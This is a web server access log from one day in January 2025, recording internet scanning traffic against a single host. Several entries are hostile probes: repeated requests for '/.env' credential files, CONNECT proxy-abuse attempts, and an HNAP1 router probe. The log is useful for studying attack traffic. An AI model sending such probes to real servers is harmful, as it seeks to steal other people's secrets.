172.202.246.146 - - [09/Jan/2025:00:18:07 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/mZc3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:33 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:34 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:34 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
198.235.24.35 - - [09/Jan/2025:05:44:10 +0000] "\x16\x03\x01" 400 526 "-" "-"
198.235.24.35 - - [09/Jan/2025:05:44:10 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:05:53:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:05:53:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:06:08:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.91.91.123 - - [09/Jan/2025:06:46:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:06:58:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:06:58:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
221.155.6.128 - - [09/Jan/2025:07:00:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
43.130.14.245 - - [09/Jan/2025:07:06:22 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
18.118.133.247 - - [09/Jan/2025:07:44:05 +0000] "\x16\x03\x01" 400 526 "-" "-"
211.48.126.44 - - [09/Jan/2025:07:45:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.118.133.247 - - [09/Jan/2025:07:45:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
193.34.212.75 - - [09/Jan/2025:07:46:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.120.112.187 - - [09/Jan/2025:07:53:06 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15"
78.153.140.93 - - [09/Jan/2025:08:09:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:08:09:03 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.162.71.210 - - [09/Jan/2025:08:13:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
154.213.184.132 - - [09/Jan/2025:08:14:58 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
117.245.23.231 - - [09/Jan/2025:08:30:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.19.138.234 - - [09/Jan/2025:08:54:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
211.114.78.177 - - [09/Jan/2025:09:18:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [09/Jan/2025:09:21:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:09:21:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
65.49.1.100 - - [09/Jan/2025:09:41:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
185.196.220.253 - - [09/Jan/2025:09:42:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
65.49.1.98 - - [09/Jan/2025:09:44:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
195.3.223.55 - - [09/Jan/2025:09:44:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.52.24.179 - - [09/Jan/2025:09:45:02 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.179 - - [09/Jan/2025:09:45:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [09/Jan/2025:09:45:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.179 - - [09/Jan/2025:09:45:18 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
65.49.1.96 - - [09/Jan/2025:09:45:19 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
164.52.24.179 - - [09/Jan/2025:09:45:22 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
172.104.11.46 - - [09/Jan/2025:09:55:33 +0000] "\x16\x03\x01" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:09:59:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.91.127.81 - - [09/Jan/2025:10:01:20 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 302 350 "-" "Mozilla/5.0"
175.208.86.131 - - [09/Jan/2025:10:33:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.125.126 - - [09/Jan/2025:10:33:46 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:10:34:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:10:34:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.52.234.112 - - [09/Jan/2025:10:36:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
164.52.24.188 - - [09/Jan/2025:11:16:43 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.188 - - [09/Jan/2025:11:17:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [09/Jan/2025:11:17:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.188 - - [09/Jan/2025:11:17:09 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [09/Jan/2025:11:17:12 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
65.20.167.6 - - [09/Jan/2025:11:36:02 +0000] "GET / HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:11:41:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:11:41:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
210.123.159.185 - - [09/Jan/2025:11:54:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
162.216.149.233 - - [09/Jan/2025:11:57:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
210.126.78.152 - - [09/Jan/2025:11:59:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [09/Jan/2025:12:14:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.213.184.23 - - [09/Jan/2025:12:25:48 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
112.162.189.244 - - [09/Jan/2025:12:43:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
184.105.139.67 - - [09/Jan/2025:12:45:55 +0000] "\x16\x03\x01" 400 526 "-" "-"
91.223.3.201 - - [09/Jan/2025:12:59:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.121.79.3 - - [09/Jan/2025:13:03:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.45.133.14 - - [09/Jan/2025:13:24:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.121.79.3 - - [09/Jan/2025:13:35:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.169.206.199 - - [09/Jan/2025:13:45:30 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
209.58.184.129 - - [09/Jan/2025:13:52:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
193.34.212.75 - - [09/Jan/2025:13:56:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [09/Jan/2025:14:18:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:14:18:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
218.149.155.123 - - [09/Jan/2025:14:25:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.121.79.3 - - [09/Jan/2025:14:28:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [09/Jan/2025:14:52:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
170.106.140.110 - - [09/Jan/2025:14:55:47 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
46.19.138.234 - - [09/Jan/2025:15:09:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [09/Jan/2025:15:11:57 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
218.93.44.86 - - [09/Jan/2025:15:12:17 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
45.83.66.84 - - [09/Jan/2025:15:16:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.93 - - [09/Jan/2025:15:16:25 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.64.93 - - [09/Jan/2025:15:16:26 +0000] "GET / HTTP/1.1" 200 1002 "http://35.220.248.27:80/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
78.153.140.93 - - [09/Jan/2025:15:35:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:15:35:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:16:00:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
80.82.77.202 - - [09/Jan/2025:16:06:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
139.59.101.104 - - [09/Jan/2025:16:11:11 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
172.168.158.226 - - [09/Jan/2025:16:18:09 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
206.168.34.203 - - [09/Jan/2025:16:20:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.203 - - [09/Jan/2025:16:20:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:47 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:50 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.203 - - [09/Jan/2025:16:20:52 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:16:21:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
